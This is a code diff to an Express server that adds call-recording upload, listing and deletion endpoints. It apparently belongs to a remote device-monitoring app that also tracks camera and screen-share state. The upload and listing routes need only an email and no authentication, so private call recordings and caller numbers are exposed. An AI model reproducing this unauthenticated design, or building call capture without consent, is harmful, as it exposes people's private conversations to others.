@@ -23,6 +23,10 @@ const UPLOADS_DIR = path.join(__dirname, '..', 'uploads');
 if (!fs.existsSync(UPLOADS_DIR)) {
   fs.mkdirSync(UPLOADS_DIR, { recursive: true });
 }
+const RECORDINGS_DIR = path.join(UPLOADS_DIR, 'recordings');
+if (!fs.existsSync(RECORDINGS_DIR)) {
+  fs.mkdirSync(RECORDINGS_DIR, { recursive: true });
+}
 
 // Serve static frontend files
 app.use(express.static(path.join(__dirname, '..', '..', 'frontend')));
@@ -62,7 +66,8 @@ function getUserState(db, email) {
       deviceInfo: null,
       cameraSource: 'back',
       cameraActive: false,
-      screenShareActive: false
+      screenShareActive: false,
+      recordings: []
     };
   } else {
     if (!db[normalizedEmail].cameraSource) {
@@ -73,6 +78,9 @@ function getUserState(db, email) {
     }
     if (db[normalizedEmail].screenShareActive === undefined) {
       db[normalizedEmail].screenShareActive = false;
+    }
+    if (!db[normalizedEmail].recordings) {
+      db[normalizedEmail].recordings = [];
     }
   }
   return db[normalizedEmail];
@@ -628,6 +636,107 @@ app.get('/api/logs', (req, res) => {
   } else {
     res.send('No crash logs yet.');
   }
+});
+
+// Call Recording upload endpoint
+app.post('/api/recordings/upload', express.raw({ type: 'audio/*', limit: '20mb' }), (req, res) => {
+  const { email, number, timestamp } = req.query;
+  if (!email) {
+    return res.status(400).json({ success: false, error: 'Email parameter is required' });
+  }
+
+  const normalizedEmail = email.toLowerCase().trim();
+  const callerNumber = number || 'Unknown';
+  const time = timestamp || new Date().toISOString();
+
+  const safeEmail = normalizedEmail.replace(/[^a-z0-9]/g, '_');
+  const safeTime = time.replace(/[^a-z0-9]/gi, '_');
+  const safeNumber = callerNumber.replace(/[^a-z0-9+]/gi, '_');
+  const filename = `${safeEmail}_${safeTime}_${safeNumber}.mp4`;
+  const filePath = path.join(RECORDINGS_DIR, filename);
+
+  try {
+    fs.writeFileSync(filePath, req.body);
+    const fileUrl = `/uploads/recordings/${filename}`;
+    const fileSize = req.body.length;
+
+    const db = readDb();
+    const userState = getUserState(db, normalizedEmail);
+
+    if (!userState.recordings) {
+      userState.recordings = [];
+    }
+
+    const newRecording = {
+      id: `${safeTime}_${Math.floor(Math.random() * 1000)}`,
+      filename: filename,
+      number: callerNumber,
+      timestamp: time,
+      url: fileUrl,
+      size: fileSize
+    };
+
+    userState.recordings.unshift(newRecording);
+    writeDb(db);
+
+    console.log(`🎙️ Call recording uploaded for ${normalizedEmail}: ${callerNumber} (${fileSize} bytes)`);
+    res.json({ success: true, recording: newRecording });
+  } catch (err) {
+    console.error('Failed to save uploaded call recording:', err);
+    res.status(500).json({ success: false, error: 'Failed to save recording file' });
+  }
+});
+
+// Fetch call recordings for specific email
+app.get('/api/recordings', (req, res) => {
+  const { email } = req.query;
+  if (!email) {
+    return res.status(400).json({ success: false, error: 'Email parameter is required' });
+  }
+
+  const normalizedEmail = email.toLowerCase().trim();
+  const db = readDb();
+  const userState = getUserState(db, normalizedEmail);
+
+  res.json({ success: true, recordings: userState.recordings || [] });
+});
+
+// Delete a call recording
+app.post('/api/recordings/delete', authenticateAdmin, (req, res) => {
+  const { email, recordingId } = req.body;
+  if (!email || !recordingId) {
+    return res.status(400).json({ success: false, error: 'Email and recordingId are required' });
+  }
+
+  const normalizedEmail = email.toLowerCase().trim();
+  const db = readDb();
+  const userState = getUserState(db, normalizedEmail);
+
+  if (!userState.recordings) {
+    return res.status(404).json({ success: false, error: 'No recordings found' });
+  }
+
+  const recIndex = userState.recordings.findIndex(r => r.id === recordingId);
+  if (recIndex === -1) {
+    return res.status(404).json({ success: false, error: 'Recording not found' });
+  }
+
+  const rec = userState.recordings[recIndex];
+  const filePath = path.join(RECORDINGS_DIR, rec.filename);
+
+  try {
+    if (fs.existsSync(filePath)) {
+      fs.unlinkSync(filePath);
+    }
+  } catch (err) {
+    console.error('Error deleting recording file:', err);
+  }
+
+  userState.recordings.splice(recIndex, 1);
+  writeDb(db);
+
+  console.log(`🎙️ Call recording deleted: ${rec.filename}`);
+  res.json({ success: true, message: 'Recording deleted successfully' });
 });
 
 
